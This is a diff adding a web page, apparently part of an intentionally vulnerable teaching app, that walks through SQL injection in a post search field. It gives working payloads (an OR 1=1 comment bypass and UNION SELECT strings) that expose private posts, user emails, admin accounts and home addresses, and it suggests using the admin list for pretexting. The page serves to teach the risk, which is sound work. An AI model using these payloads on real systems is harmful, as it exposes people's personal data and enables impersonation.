@@ -1,0 +1,59 @@
+<h1> Document </h1>
+<p>Let me explain what happened in the post page.</p><br>
+<p>Lets pretend for a minute that the webpage was hosted publicly. Lets see what we could do.</p><br>
+
+<strong>Attacking the database:Get the private posts</strong><br>
+<%= image_tag("Example1.jpg") %><br>
+
+<p> The image above is the users database</p>
+
+<strong> Injecting sql into the database</strong>
+<p> If you input "Wine Food Pairings" or "1=1)--" into the search field </p>
+<%= image_tag("Example2.jpg") %>
+<p> This executes the SQL:</p>
+<p> Post Load (0.3ms)  SELECT "posts".* FROM "posts" WHERE (title = 'Wine Food Pairings' or 1=1) --' and private = false) </p><br>
+<p> The result is: </p>
+<%= image_tag("Example3.jpg") %>
+<p> Private posts are now returned!</p>
+<br>
+
+<strong> Getting all the users emails in the database.</strong>
+<p> You can make the search field return the users data</p>
+<p> You can do this by inputting the " Cheese') union select 1, email,'', null, null, true from users --" </p>
+    <%= image_tag("Example4.jpg") %>
+<p> It executes the following in the SQL database:</p>
+<p> Post Load (0.6ms)  SELECT "posts".* FROM "posts" WHERE (title = 'Cheese') union select 1, email,'', null, null, true from users --' and private = false) </p>
+<p> What we did here is 'union' with the 'users' table, adding those records to what is displayed.</p>
+<%= image_tag("Example5.jpg") %><br>
+
+
+<strong> Find which users are admins </strong>
+<p> If we wanted to find out which of the above users were admins, we just need to modify the last query slightly.</p>
+<p>Input the following "Cheese') union select 1,email,'', null, null, true from users where admin = true --" </p>
+<%= image_tag("Example4.jpg") %>
+<p> This executes the following SQL:</p>
+<p>Post Load (0.6ms)  SELECT "posts".* FROM "posts" WHERE (title = 'Cheese') union select 1,email,'', null, null, true from users where admin = true --' and private = false) </p><br>
+<p> And this returns:</p>
+<%= image_tag("Example6.jpg") %>
+<p>As an attacker, I now know the admins. Admins are likely well-trusted within the <br>
+organization. If I wanted to pretend to be someone over the phone/email to gain <br>
+more information, it’s a great place to start.</p>
+
+<strong> Get users addresses</strong>
+<p> Let’s find out where other users live. We’ll modify one of the previous queries to add address information.</p>
+<p>Input the following "Cheese') union select 1, email, address, null, null, true from users -- "</p>
+<%= image_tag("Example7.jpg") %>
+
+<p>This excutes the following SQL:</p>
+<p>Post Load (1.2ms)  SELECT "posts".* FROM "posts" WHERE (title = 'Cheese') union select 1, email, address, null, null, true from users --' and private = false) </p>
+<p> This is what it returns</p>
+<%= image_tag("Example8.jpg") %>
+
+
+
+<p> Imagine that there was credit card information stored in the database!</p>
+<br>
+
+<h3>Conclusion</h3>
+<p>This wasn’t intended to teach you how to break into web apps . Please don’t. But it should give you a sense of how SQL injection works and the damage that security flaws can cause.</p>
+
